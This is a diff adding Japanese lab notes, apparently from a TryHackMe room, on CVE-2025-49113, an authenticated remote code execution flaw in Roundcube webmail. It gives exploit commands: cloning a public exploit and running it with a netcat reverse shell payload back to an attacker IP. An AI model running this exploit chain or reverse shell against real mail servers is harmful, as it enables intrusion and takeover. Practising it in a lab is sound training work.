@@ -1,5 +1,21 @@
 # CVE
 
+## CVE-2025-49113 (Roundcube)
+
+https://tryhackme.com/room/roundcubecve202549113
+
+- [Roundcube](https://roundcube.net/) は、オープンソースウェブメールプロジェクト
+- `1.5.x < 1.5.10`、`1.6.x < 1.6.11`
+- RCE (Authenticated)
+
+```sh
+git clone https://github.com/fearsoff-org/CVE-2025-49113
+cd CVE-2025-49113/
+
+# 必ず成功するとは限らないので、何度か実行してみる。
+php CVE-2025-49113.php http://10.10.220.172/roundcube <user> <password> "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 4444 >/tmp/f"
+```
+
 ## CVE-2025-32433
 
 https://tryhackme.com/room/erlangotpsshcve202532433
